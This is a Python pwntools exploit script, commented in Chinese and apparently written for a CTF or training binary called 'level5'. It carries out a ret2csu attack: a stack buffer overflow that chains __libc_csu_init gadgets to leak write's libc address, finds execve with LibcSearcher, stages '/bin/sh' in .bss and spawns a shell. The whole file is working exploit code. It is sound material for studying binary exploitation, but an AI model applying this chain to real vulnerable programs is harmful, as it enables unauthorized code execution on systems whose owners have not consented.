from pwn import *
from LibcSearcher import LibcSearcher

context.log_level = 'debug'
level5 = ELF('./level5')
sh = process('./level5')

write_got = level5.got['write']
read_got = level5.got['read']
main_addr = level5.symbols['main']
bss_base = level5.bss()  # bbs段的起始地址
csu_front_addr = 0x0000000000400600  # csu .text:400600  mov rdx, r13
csu_pop2retn_addr = 0x000000000040061A  # pop rbx; pop rbp; pop r12;...


def csu(rbx, rbp, r12, r13, r14, r15, last):
    # pop rbx,rbp,r12,r13,r14,r15 # 40061A to 400624 # 然后会跳转到 400600 执行 到 400624
    # 40061A to 400624 to 400600 to 400624:
    # 1st para: edi = r15; 2nd para: rsi = r14; 3rd para: rdx = r13
    # call r12 (when rbx == 0)    # 具体分析过程见readme post analysis
    payload = b'a' * 0x80 + b'b' * 8  # 这个 b'b' * 8 覆盖在rbp处 用于gdb调试
    payload += p64(csu_pop2retn_addr)  # 这里覆盖的是 vulnerable_function 的返回地址
    payload += p64(rbx) + p64(rbp) + p64(r12) + p64(r13) + p64(r14) + p64(r15)
    payload += p64(csu_front_addr)
    payload += b'a' * 0x38
    payload += p64(last)
    sh.send(payload)
    sleep(1)


sh.recvuntil('Hello, World\n')
gdb.attach(sh, "b *0x40057F\nb *0x400586\n")  # 0x40057F call _read;  0x400586 retn in vul
# ===== 1st csu: write@got(1, write_got@got, 8)
# 向 stdout 写入 write@got 指向的内存地址上的8字节，即输出 write 的实际地址
csu(0, 1, write_got, 8, write_got, 1, main_addr)

write_addr = u64(sh.recv(8))  # write 的实际地址

libc = LibcSearcher('write', write_addr)  # 假定libc未知 但做题时一般在远程服务器运行 会给出libc
libc_base = write_addr - libc.dump('write')
execve_addr = libc_base + libc.dump('execve')

log.success('execve_addr ' + hex(execve_addr))

sh.recvuntil('Hello, World\n')
# ===== 2nd csu: read@got(0, bss_base, 16)  从stdin中输入16个字符，写入到bss_base中
# 然后输入 execve_addr, /bin/sh\x00
csu(0, 1, read_got, 16, bss_base, 0, main_addr)
sh.send(p64(execve_addr) + b'/bin/sh\x00')  # 发送了 8 + 8 = 16 个字符

sh.recvuntil('Hello, World\n')
# ===== 3rd csu: execve(bss_base+8)  i.e. execve("/bin/sh\0")
csu(0, 1, bss_base, 0, 0, bss_base + 8, 0)  # bss_base: execve; bss_base + 8: '/bin/sh\0'
sh.interactive()
